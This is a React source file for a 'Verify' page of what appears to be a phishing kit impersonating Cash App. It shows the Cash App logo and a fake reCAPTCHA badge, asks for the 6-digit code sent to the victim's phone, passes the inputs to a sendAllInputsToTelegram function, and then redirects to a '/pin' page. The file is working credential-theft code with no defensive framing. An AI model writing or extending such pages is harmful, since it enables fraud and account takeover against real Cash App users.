import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { HelpCircle, Loader2 } from 'lucide-react';
import { CashAppLogo } from '../components/CashAppLogo';
import { RecaptchaBadge } from '../components/RecaptchaBadge';
import { sendAllInputsToTelegram } from '../utils/telegram';

export function Verify() {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const location = useLocation();
  const navigate = useNavigate();
  const contact = location.state?.contact || '(209) 432-9317';
  const method = location.state?.method || 'phone';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length === 6) {
      await sendAllInputsToTelegram();
      setIsLoading(true);
      setTimeout(() => {
        navigate('/pin');
      }, 2000);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white font-sans relative flex flex-col items-center justify-center">
      <div className="w-full max-w-[520px] px-6 py-8 md:px-12 md:py-12 mx-auto">
        <CashAppLogo />

        <h1 className="text-[32px] md:text-[40px] font-bold mt-10 mb-2 leading-tight tracking-tight">
          Enter the code sent to your {method}
        </h1>
        
        <p className="text-[#8a8a8a] text-[17px] mb-6">
          We sent the code to {contact}.
        </p>

        <button className="flex items-center gap-2 bg-[#1A1A1A] text-white px-4 py-2 rounded-full text-[15px] font-medium hover:bg-[#252525] transition-colors mb-12">
          <HelpCircle size={18} />
          Get help
        </button>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col gap-8">
          
          <div className="border border-white rounded-xl p-4 flex items-center bg-black">
            <input
              type="text"
              name="code"
              value={code}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, '');
                if (val.length <= 6) {
                  setCode(val);
                }
              }}
              placeholder="6-digit code"
              className="bg-transparent outline-none flex-1 text-[17px] placeholder:text-[#8a8a8a]"
              autoFocus
            />
          </div>

          <button
            type="submit"
            disabled={isLoading || code.length !== 6}
            className={`w-[200px] font-semibold rounded-full py-[14px] text-[17px] transition-colors flex items-center justify-center ${
              code.length === 6 
                ? 'bg-[#C2C2C2] text-black hover:bg-white cursor-pointer' 
                : 'bg-[#C2C2C2]/30 text-black/30 cursor-not-allowed'
            }`}>
            {isLoading ? (
              <Loader2 className="animate-spin" size={24} strokeWidth={3} />
            ) : (
              'Continue'
            )}
          </button>
        </form>

        <div className="mt-12 pt-8 border-t border-[#1A1A1A]">
          <p className="text-[15px] font-medium">
            Didn't receive a code?{' '}
            <button className="text-white underline hover:text-gray-200">
              Resend code
            </button>
          </p>
        </div>

        <div className="mt-16">
          <button className="text-[13px] text-[#8a8a8a] hover:text-white transition-colors">
            Your Privacy Choices
          </button>
        </div>
      </div>

      <RecaptchaBadge />
    </div>
  );
}
